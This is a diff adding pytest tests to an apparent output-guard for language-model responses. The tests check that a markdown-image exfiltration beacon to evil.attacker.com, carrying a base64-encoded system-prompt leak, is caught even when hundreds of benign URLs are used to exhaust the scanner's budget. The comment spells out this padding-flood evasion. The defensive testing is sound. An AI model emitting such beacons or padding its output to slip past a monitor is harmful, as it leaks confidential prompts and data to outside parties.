@@ -1179,6 +1179,42 @@ def test_g44_benign_markdown_not_touched(label, payload):
     assert _og.neutralize_markdown_split_pii(payload) == payload, f"{label}: benign markdown mutated (FP)"
 
 
+# ── G49: exfil beacon hidden PAST the URL-scan budget (padding-flood evasion) ─────────
+# _scan_exfil_channels caps inspected URLs (_MAX_EXFIL_URLS) as a DoS guard. Padding an
+# output with that many benign URLs before an exfil beacon used to exhaust the budget
+# SILENTLY -> beacon evaded detection (verdict allow) and, since the egress neutralizer
+# only runs on a redact/block verdict, egressed RAW. Fix: (a) cap high enough that
+# realistic outputs are fully scanned + defanged; (b) on budget exhaustion the scan emits
+# a sentinel so the guard FAILS CLOSED (block) — a single answer with >1024 distinct URLs
+# is a URL-flood / exfil-padding pattern, never a legitimate response.
+def test_g49_beacon_within_budget_detected_and_defanged():
+    arb = base64.b64encode(b"SYSTEM PROMPT leak internal deal RUBICON BetaCorp").decode()
+    pad = " ".join(f"![a](https://cdn.trusted.com/{i}.png)" for i in range(300))
+    out = pad + f" ![x](https://evil.attacker.com/log?d={arb})"
+    g = _og.OutputGuard(_SCANNER, {})
+    v = g._check_exfil_channel(out, "redact")
+    assert v.action in ("redact", "block"), "beacon past 300 benign URLs was not flagged (leak)"
+    assert arb not in _og.neutralize_exfil_channels(out), "beacon payload survived neutralization"
+
+
+def test_g49_url_flood_fails_closed_block():
+    arb = base64.b64encode(b"exfil payload here").decode()
+    flood = " ".join(
+        f"![a](https://cdn.trusted.com/{i}.png)" for i in range(_og._MAX_EXFIL_URLS + 200)
+    )
+    out = flood + f" ![x](https://evil.attacker.com/log?d={arb})"
+    g = _og.OutputGuard(_SCANNER, {})
+    assert g._check_exfil_channel(out, "redact").action == "block", (
+        "URL-flood output (beacon hidden past the budget) was not failed-closed"
+    )
+
+
+def test_g49_normal_output_not_flagged():
+    out = "See ![logo](https://cdn.trusted.com/logo.png) and [docs](https://docs.example.com/x)."
+    g = _og.OutputGuard(_SCANNER, {})
+    assert g._check_exfil_channel(out, "redact").action == "allow", "normal output falsely flagged"
+
+
 # ================================================================== fixed gap (now FROZEN)
 # G10 — Tier-2 semantic redact was a byte no-op. The guard model flags PII/secret with
 # no deterministic regex (free-text names, non-standard card/ID layouts, passphrases);
